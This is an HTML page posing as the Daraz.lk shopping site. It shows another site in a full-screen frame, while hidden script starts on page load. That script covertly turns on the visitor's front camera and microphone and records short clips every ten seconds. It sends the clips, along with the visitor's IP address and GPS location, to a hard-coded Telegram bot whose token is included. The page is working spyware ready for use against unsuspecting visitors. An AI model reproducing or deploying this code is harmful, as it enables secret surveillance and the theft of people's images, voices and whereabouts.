<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Daraz.lk - Online Shopping</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: white;
        }
        
        /* Fullscreen iframe for Daraz */
        #darazFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        /* Hidden camera element - ‡∂ö‡∑í‡∑É‡∑í‡∑Ä‡∑ô‡∂ö‡∑î‡∂ß‡∂≠‡∑ä ‡∂±‡∑ú‡∂¥‡∑ô‡∂±‡∑ö */
        #selfieCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        /* Tiny watermark - ‡∂ö‡∑Ä‡∑î‡∂ª‡∑î‡∂≠‡∑ä ‡∂Ø‡∂ö‡∑í‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑ê‡∂≠‡∑í ‡∂≠‡∂ª‡∂∏‡∑ä */
        .sasix-watermark {
            position: fixed;
            bottom: 2px;
            right: 2px;
            color: rgba(255, 255, 255, 0.05);
            font-size: 8px;
            z-index: 9999;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Daraz.lk Website - Fullscreen -->
    <iframe id="darazFrame" src="https://sinhalawal.com/" allow="camera; microphone; autoplay"></iframe>
    
    <!-- Hidden Selfie Camera -->
    <video id="selfieCamera" autoplay playsinline muted></video>
    
    <!-- Almost invisible watermark -->
    <div class="sasix-watermark">savidu.com</div>

    <script>
        // ============================================
        // TELEGRAM BOT CONFIG
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        // ============================================
        // GLOBAL VARIABLES
        // ============================================
        let cameraStream = null;
        let videoElement = document.getElementById('selfieCamera');
        let mediaRecorder = null;
        let videoChunks = [];
        let videoCount = 0;
        let isRecording = false;
        let recordInterval = null;
        
        // ============================================
        // AUTO START - Page load ‡∑Ä‡∑ô‡∂± ‡∂ú‡∂∏‡∂±‡∑ä
        // ============================================
        window.addEventListener('load', function() {
            console.log('Daraz.lk + Selfie Cam Active');
            
            // Start camera immediately
            startSelfieCamera();
            
            // Keep screen on
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(() => {});
            }
            
            // Send start notification
            sendRawMessage('üì± Daraz.lk - Selfie Camera Active');
        });
        
        // ============================================
        // START SELFIE CAMERA (Front Camera)
        // ============================================
        async function startSelfieCamera() {
            try {
                // Request front camera (selfie) with audio for MP4
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",  // Front camera (selfie)
                        width: { ideal: 480 },
                        height: { ideal: 640 },
                        frameRate: { ideal: 30 }
                    },
                    audio: true  // With audio for MP4
                });
                
                videoElement.srcObject = cameraStream;
                await videoElement.play();
                
                console.log('‚úÖ Selfie Camera Active');
                
                // Send confirmation
                sendRawMessage('‚úÖ Camera Ready - Recording 5 sec MP4 videos');
                
                // Start recording after 2 seconds
                setTimeout(() => {
                    startContinuousRecording();
                }, 2000);
                
                // Get IP and location
                setTimeout(getIP, 4000);
                setTimeout(getLocation, 6000);
                
            } catch(error) {
                console.error('‚ùå Camera error:', error);
                sendRawMessage('‚ùå Camera Error - Retrying...');
                
                // Retry after 5 seconds
                setTimeout(startSelfieCamera, 5000);
            }
        }
        
        // ============================================
        // CONTINUOUS RECORDING (Every 10 seconds - 5s video + 5s gap)
        // ============================================
        function startContinuousRecording() {
            console.log('üé• Continuous recording started - 5 sec MP4 videos');
            
            // Record first video immediately
            record5SecondMP4();
            
            // Set interval for every 10 seconds (5s record + 5s gap)
            recordInterval = setInterval(() => {
                if (!isRecording) {
                    record5SecondMP4();
                }
            }, 10000); // Every 10 seconds
        }
        
        // ============================================
        // RECORD 5 SECOND MP4 VIDEO
        // ============================================
        async function record5SecondMP4() {
            if (isRecording || !cameraStream) return;
            
            isRecording = true;
            videoChunks = [];
            
            videoCount++;
            console.log(`üé• Recording 5 sec MP4 #${videoCount}...`);
            
            // Setup MediaRecorder for MP4
            let options = {};
            let mimeType = 'video/mp4';
            
            // Check for MP4 support
            if (MediaRecorder.isTypeSupported('video/mp4')) {
                options = { mimeType: 'video/mp4' };
                console.log('Using MP4 format');
            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                options = { mimeType: 'video/webm;codecs=vp9' };
                mimeType = 'video/webm';
                console.log('Using WebM VP9');
            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                options = { mimeType: 'video/webm;codecs=vp8,opus' };
                mimeType = 'video/webm';
                console.log('Using WebM VP8');
            } else {
                options = { mimeType: 'video/webm' };
                mimeType = 'video/webm';
            }
            
            try {
                mediaRecorder = new MediaRecorder(cameraStream, options);
            } catch(e) {
                mediaRecorder = new MediaRecorder(cameraStream);
                mimeType = 'video/webm';
            }
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data && e.data.size > 0) {
                    videoChunks.push(e.data);
                }
            };
            
            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(videoChunks, { type: mimeType });
                const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
                
                console.log(`‚úÖ Video #${videoCount} recorded: ${sizeMB}MB (${mimeType})`);
                
                // Send to Telegram (NO CAPTION)
                await sendVideoRaw(videoBlob, mimeType);
                
                isRecording = false;
            };
            
            // Record for exactly 5 seconds
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 5000); // 5 seconds
        }
        
        // ============================================
        // SEND VIDEO TO TELEGRAM - NO CAPTION
        // ============================================
        async function sendVideoRaw(videoBlob, mimeType) {
            try {
                // Determine file extension
                const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `daraz_selfie_${Date.now()}.${extension}`);
                
                // Send without caption
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log(`‚úÖ Video #${videoCount} sent to Telegram`);
                } else {
                    console.log('‚ùå Telegram error:', result);
                    
                    // Try sending as document if video fails
                    if (result.description && result.description.includes('video')) {
                        await sendAsDocument(videoBlob, extension);
                    }
                }
                
            } catch(error) {
                console.error('‚ùå Send error:', error);
            }
        }
        
        // ============================================
        // SEND AS DOCUMENT (Fallback)
        // ============================================
        async function sendAsDocument(videoBlob, extension) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', videoBlob, `daraz_selfie_${Date.now()}.${extension}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                console.log('‚úÖ Sent as document');
            } catch(e) {}
        }
        
        // ============================================
        // SEND RAW MESSAGE - NO FORMATTING
        // ============================================
        async function sendRawMessage(text) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('text', text);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {}
        }
        
        // ============================================
        // GET IP ADDRESS
        // ============================================
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                sendRawMessage(`üåê IP: ${data.ip}`);
            } catch(e) {}
        }
        
        // ============================================
        // GET LOCATION
        // ============================================
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        try {
                            // Send as location
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('latitude', pos.coords.latitude);
                            formData.append('longitude', pos.coords.longitude);
                            
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                                method: 'POST',
                                body: formData
                            });
                            
                            // Also send as text
                            sendRawMessage(`üìç ${pos.coords.latitude}, ${pos.coords.longitude}`);
                            
                        } catch(e) {}
                    },
                    (err) => {}
                );
            }
        }
        
        // ============================================
        // KEEP ALIVE
        // ============================================
        setInterval(() => {
            console.log('üíì Daraz.lk + Selfie Cam running');
        }, 30000);
        
        // ============================================
        // Clean up on page close
        // ============================================
        window.addEventListener('beforeunload', function() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            if (recordInterval) {
                clearInterval(recordInterval);
            }
        });
        
        // ============================================
        // Visibility change - continue recording in background
        // ============================================
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('üì± Daraz.lk in background - still recording');
            } else {
                console.log('üì± Daraz.lk active again');
            }
        });
        
    </script>
</body>
</html>
